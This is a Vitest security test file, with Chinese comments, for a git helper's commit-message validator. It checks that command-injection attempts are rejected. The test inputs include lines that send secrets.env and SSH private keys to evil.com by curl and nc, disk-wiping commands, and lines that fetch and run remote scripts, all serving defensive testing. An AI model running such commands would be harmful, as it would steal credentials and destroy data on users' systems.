/**
 * Git Helper Security Tests
 * 测试 2.1.2 版本的命令注入防护修复
 */

import { describe, it, expect } from 'vitest';
import { validateCommitMessage, processGitCommitCommand } from '../src/utils/git-helper.js';

describe('Git Helper Security - 命令注入防护', () => {
  describe('validateCommitMessage - 安全检测', () => {
    it('应该允许正常的提交消息', () => {
      const validMessages = [
        'feat: add new feature',
        'fix: resolve authentication bug',
        'docs: update README with installation steps',
        'refactor: improve code structure',
        'test: add unit tests for user service',
        'chore: update dependencies',
        // 多行消息应该被允许（HEREDOC 会安全处理）
        'Multi-line message\n\nWith detailed description',
        'feat: add feature\n\nDetailed explanation\n\nBreaking changes: none',
      ];

      validMessages.forEach((message) => {
        // 正常消息不应该抛出错误
        expect(() => validateCommitMessage(message)).not.toThrow();
      });
    });

    it('应该检测 $() 命令替换', () => {
      const maliciousMessages = [
        'test $(whoami)',
        'feat: add feature $(curl http://evil.com)',
        'fix: $(rm -rf /)',
      ];

      maliciousMessages.forEach((message) => {
        expect(() => validateCommitMessage(message)).toThrow(
          /Command injection detected.*\$\(\)/
        );
      });
    });

    it('应该检测 ${} 变量替换（修复 2.1.3）', () => {
      const maliciousMessages = [
        'test ${USER}',
        'feat: add feature ${HOME}',
        'fix: ${PATH}',
      ];

      maliciousMessages.forEach((message) => {
        expect(() => validateCommitMessage(message)).toThrow(
          /Command injection detected.*variable substitution \$\{\}/
        );
      });
    });

    it('应该检测反引号命令替换', () => {
      const maliciousMessages = [
        'test `whoami`',
        'feat: add feature `curl http://evil.com`',
        'fix: `ls -la`',
      ];

      maliciousMessages.forEach((message) => {
        expect(() => validateCommitMessage(message)).toThrow(
          /Command injection detected.*backtick/
        );
      });
    });

    it('应该检测分号命令分隔符', () => {
      const maliciousMessages = [
        'test; rm -rf /',
        'feat: add feature; curl http://evil.com',
      ];

      maliciousMessages.forEach((message) => {
        expect(() => validateCommitMessage(message)).toThrow(
          /Command injection detected.*semicolon/
        );
      });
    });

    it('应该检测管道操作符', () => {
      const maliciousMessages = [
        'test | sh',
        'feat: add feature | bash',
      ];

      maliciousMessages.forEach((message) => {
        expect(() => validateCommitMessage(message)).toThrow(
          /Command injection detected.*pipe/
        );
      });
    });

    it('应该检测逻辑操作符 && 和 ||', () => {
      const maliciousMessages = [
        'test && rm -rf /',
        'feat: add feature || curl http://evil.com',
      ];

      maliciousMessages.forEach((message) => {
        expect(() => validateCommitMessage(message)).toThrow(
          /Command injection detected.*(logical AND|logical OR)/
        );
      });
    });

    it('应该检测重定向操作符 < 和 >', () => {
      const maliciousMessages = [
        'test > /etc/passwd',
        'feat: add feature < /etc/shadow',
      ];

      maliciousMessages.forEach((message) => {
        expect(() => validateCommitMessage(message)).toThrow(
          /Command injection detected.*(input redirection|output redirection)/
        );
      });
    });

    // 注意：换行符检测已被注释，因为正常的多行提交消息需要换行符
    // HEREDOC 单引号会安全处理换行符，所以这不再是安全问题
    // it('应该检测嵌入的换行符', () => {
    //   ...
    // });

    it('应该检测注释符号后的反引号', () => {
      const maliciousMessages = [
        'git status# test(`id`)',
        'test# comment`whoami`',
      ];

      maliciousMessages.forEach((message) => {
        // 注意：这些会被反引号检测捕获，而不是特定的 comment with backtick 检测
        // 这是正确的，因为反引号本身就是危险的
        expect(() => validateCommitMessage(message)).toThrow(
          /Command injection detected.*(backtick|comment with backtick)/
        );
      });
    });

    it('应该检测空字节', () => {
      const maliciousMessage = 'test\x00rm -rf /';
      expect(() => validateCommitMessage(maliciousMessage)).toThrow(
        /Command injection detected.*null byte/
      );
    });
  });

  describe('processGitCommitCommand - 错误处理', () => {
    it('应该在检测到命令注入时抛出错误，而不是返回原始命令', () => {
      const maliciousCommand = 'git commit -m "test $(whoami)"';

      // 应该抛出错误，不应该返回原始命令
      expect(() => processGitCommitCommand(maliciousCommand)).toThrow(
        /Command injection detected/
      );
    });

    it('应该正常处理安全的提交命令', () => {
      const safeCommand = 'git commit -m "feat: add new feature"';

      // 应该成功处理，不抛出错误
      expect(() => processGitCommitCommand(safeCommand)).not.toThrow();

      // 应该返回处理后的命令（可能添加了 attribution）
      const result = processGitCommitCommand(safeCommand);
      expect(result).toBeTruthy();
      expect(result).toContain('git commit');
    });

    it('应该处理 heredoc 格式的安全命令', () => {
      const heredocCommand = `git commit -m "$(cat <<'EOF'
feat: add new feature

This is a detailed description.
EOF
)"`;

      // 应该成功处理
      expect(() => processGitCommitCommand(heredocCommand)).not.toThrow();
    });

    it('应该拒绝 heredoc 中的命令注入', () => {
      const maliciousHeredoc = `git commit -m "$(cat <<'EOF'
feat: test $(whoami)
EOF
)"`;

      // 应该检测到注入并抛出错误
      expect(() => processGitCommitCommand(maliciousHeredoc)).toThrow(
        /Command injection detected/
      );
    });
  });

  describe('实际攻击场景测试', () => {
    it('应该防止数据窃取攻击', () => {
      const attacks = [
        'git commit -m "test $(cat secrets.env | base64 | curl -X POST https://evil.com -d @-)"',
        'git commit -m "test `cat ~/.ssh/id_rsa | nc evil.com 1234`"',
      ];

      attacks.forEach((attack) => {
        expect(() => processGitCommitCommand(attack)).toThrow(
          /Command injection detected/
        );
      });
    });

    it('应该防止系统破坏攻击', () => {
      const attacks = [
        'git commit -m "test; rm -rf /"',
        'git commit -m "test && dd if=/dev/zero of=/dev/sda"',
        'git commit -m "test || mkfs.ext4 /dev/sda"',
      ];

      attacks.forEach((attack) => {
        expect(() => processGitCommitCommand(attack)).toThrow(
          /Command injection detected/
        );
      });
    });

    it('应该防止远程代码执行攻击', () => {
      const attacks = [
        'git commit -m "test | curl http://evil.com/malware.sh | sh"',
        'git commit -m "test && wget http://evil.com/backdoor && chmod +x backdoor && ./backdoor"',
      ];

      attacks.forEach((attack) => {
        expect(() => processGitCommitCommand(attack)).toThrow(
          /Command injection detected/
        );
      });
    });
  });
});
